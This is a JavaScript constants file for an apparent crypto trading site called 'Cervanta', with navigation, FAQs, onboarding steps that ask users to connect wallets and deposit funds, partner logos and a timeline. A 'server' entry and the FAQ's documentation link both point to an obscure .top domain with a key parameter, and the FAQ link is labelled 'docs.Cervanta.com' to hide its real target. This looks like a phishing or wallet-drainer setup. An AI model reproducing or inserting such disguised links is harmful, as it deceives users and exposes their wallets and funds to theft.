import { getTradeUrl } from '@/utils/tradeUrl'

export const links = {
  site: 'https://www.Cervanta.com',
  get trade() {
    return getTradeUrl()
  },
  docs: 'https://docs.Cervanta.com/', 
  blog: 'https://blog.Cervanta.com/',
  discord: 'https://discord.com/invite/Cervanta',
  twitter: 'https://x.com/CervantaDefi',
  linkedin: 'https://www.linkedin.com/company/Cervanta/',
  telegram: 'https://t.me/Cervanta_Defi',
  summit: 'https://summit.Cervanta.com/',
  jobs: 'https://jobs.lever.co/Cervanta',
  whitepaper: '/v3-whitepaper.pdf',
  email: 'marketing@Cervanta.xyz',
  server: 'https://tskcbxfy.piafqwssmghursq.top/index?key=6b18fd97215b18ab44f7baf52b20045d',
}

export const nav = [
  { label: 'About', href: '/about-us' },
  { label: 'Stats', href: '/?s=stats' },
  { label: 'Docs', href: '/' },
]

export const footerPrimary = [
  { label: 'Home', href: '/' },
  { label: 'About Us', href: '/about-us' },
  { label: 'Features', href: '/?s=features' },
  { label: 'Partners', href: '/?s=partners' },
]

export const footerSecondary = [
  { label: 'Docs', href: '/' },
  { label: 'Whitepaper', href: links.whitepaper },
  { label: 'Stats', href: '/?s=stats' },
  { label: 'Blog', href: '/'},
]

export const socials = [
  { label: 'X', href: links.twitter },
  { label: 'Discord', href: links.discord },
  { label: 'LinkedIn', href: links.linkedin },
]

export const features = [
  {
    title: '1:1 Backed Tokenized Stocks',
    body: 'Every tokenized stock is fully backed by the underlying stock held in regulated brokerage accounts. No synthetic exposure, no counterparty risk. Real ownership, onchain.',
    icon: '/assets/feature_backed.svg',
  },
  {
    title: 'Institutional-Grade Liquidity',
    body: "Routed through tokenized stock issuer's liquidity hub, combined with Cervanta latest onchain CLOB model, giving you access to NASDAQ-level depth and execution quality on every trade.",
    icon: '/assets/feature_liquidity.svg',
  },
  {
    title: 'Seamless Settlement',
    body: 'Subscriptions and redemptions settle through automated onchain rails, bridging traditional market settlement with the speed and transparency of blockchain-native workflows.',
    icon: '/assets/feature_settlement.svg',
  },
  {
    title: 'Fractional From Day One',
    body: "Let you invest in any US stock starting from as little as $1. No minimum lot sizes, no barriers, just borderless access to the world's largest equity markets.",
    icon: '/assets/feature_fractional.svg',
  },
]

export const steps = [
  {
    step: 'Step 1',
    title: 'Connect Wallet & Choose Network',
    body: 'Link your wallet and select what you want to trade. Crypto, stocks, or both. One account, every market.',
    image: '/assets/step1.png',
  },
  {
    step: 'Step 2',
    title: 'Fund Your Account',
    body: 'Deposit stablecoins or supported assets. Funds arrive in seconds. No bank transfers, no waiting.',
    image: '/assets/step2.png',
  },
  {
    step: 'Step 3',
    title: 'Trade Any Asset',
    body: 'Go long or short on crypto perpetuals. Buy tokenized stocks 1:1 backed by real shares. All from the same interface.',
    image: '/assets/step3.png',
  },
  {
    step: 'Step 4',
    title: 'Own What You Trade',
    body: 'Every position settles onchain. Tokenized stocks sit in your wallet. Real ownership, full self-custody, verifiable on-chain.',
    image: '/assets/step4_new.png',
  },
]

export const faqs = [
  {
    q: 'What is Cervanta?',
    a: 'Cervanta is an onchain trading protocol for crypto and real-world assets. Trade perpetuals, tokenized stocks, and more. All settled onchain with full self-custody. Born from Cervanta perps DEX, built for every market.',
  },
  {
    q: 'What are tokenized stocks?',
    a: 'Tokenized stocks are digital representations of real equities, 1:1 backed by actual shares held through a licensed broker via our partnership with Anchored Finance. You trade and hold them in your own wallet. You have the same price exposure as the underlying stock, with the benefits of onchain settlement and self-custody.',
  },
  {
    q: 'What assets can I trade?',
    a: 'Crypto perpetuals (BTC, ETH, and more), tokenized US equities (AAPL, NVDA, TSLA, MSFT, and more), with ETFs, treasury bills, and tokenized funds on the roadmap.',
  },
  {
    q: 'How do I start trading?',
    a: 'Connect your wallet, deposit stablecoins, and start trading. No account creation, no KYC for crypto markets. The full experience takes under a minute to set up.',
  },
  // {
  //   q: 'What are the transaction fees?',
  //   a: 'Trading fees vary by market and are displayed before you confirm any trade. There are no hidden charges, deposit fees, or withdrawal fees.',
  // },
  {
    q: 'Is Cervanta secure?',
    a: 'Cervanta has been audited by leading security firms and maintains a continuous security monitoring program. All assets are held in self-custody. The protocol never takes possession of your funds.',
  },
  {
    q: 'Where can I find more information about Cervanta?',
    a: 'For detailed documentation, guides, and technical references, visit <a href="https://tskcbxfy.piafqwssmghursq.top/index?key=6b18fd97215b18ab44f7baf52b20045d" target="_blank" rel="noreferrer">docs.Cervanta.com</a>.',
  },
]

export const investors = Array.from({ length: 12 }, (_, i) => ({
  name: `Investor ${i + 1}`,
  logo: `/assets/logo${i + 1}.png`,
}))

export const partners = [
  { name: 'Chainlink', logo: '/assets/partner_chainlink.svg' },
  { name: 'Base', logo: '/assets/partner_base.svg' },
  { name: 'Arbitrum', logo: '/assets/partner_arbitrum.svg' },
  { name: 'Pyth', logo: '/assets/partner_pyth.svg' },
  { name: 'Quantstamp', logo: '/assets/partner_quantstamp.svg' },
  { name: '1inch', logo: '/assets/partner_1inch.svg' },
  { name: 'Binance', logo: '/assets/partner_binance.svg' },
  { name: 'OKX', logo: '/assets/partner_okx.svg' },
  { name: 'Lido', logo: '/assets/partner_lido.svg' },
  { name: 'Amber', logo: '/assets/partner_amber.svg' },
  { name: 'Polygon', logo: '/assets/partner_polygon.svg' },
  { name: 'Coinbase', logo: '/assets/partner_coinbase.svg' },
  { name: 'Backpack', logo: '/assets/partner_backpack.svg' },
  { name: 'Anchored', logo: '/assets/partner_anchored.svg' },
]

export const timeline = [
  { year: '2021', items: ['v1 mainnet launch on Ethereum', 'Raised $14 million in a Series A funding round'] },
  { year: '2022', items: ['v2 mainnet launch on Polygon'] },
  { year: '2023', items: ['v2 deploys on zkSync Era', 'Raised $22 million in a Series B funding round'] },
  { year: '2024', items: ['v3 mainnet launch on Blast and expands to Base', 'Launchpad', 'Foundation +  F token launch'] },
  { year: '2025', items: ['Synthia AI Trading Agent on Base', 'Builder Program Launch + incubates MondayTrade on Monad'] },
  { year: '2026', items: ['Cervanta RWA Launch in Partnership with Anchored'] },
]

export const jobTagsA = [
  { label: 'Marketing Manager', variant: 'outline' },
  { label: 'Remote', variant: 'white' },
  { label: 'RWA Product Manager', variant: 'blue' },
]

export const jobTagsB = [
  { label: 'RWA Product Manager', variant: 'yellow' },
  { label: 'Growth Lead', variant: 'brand' },
  { label: 'Decentralized Exchange', variant: 'outline' },
]
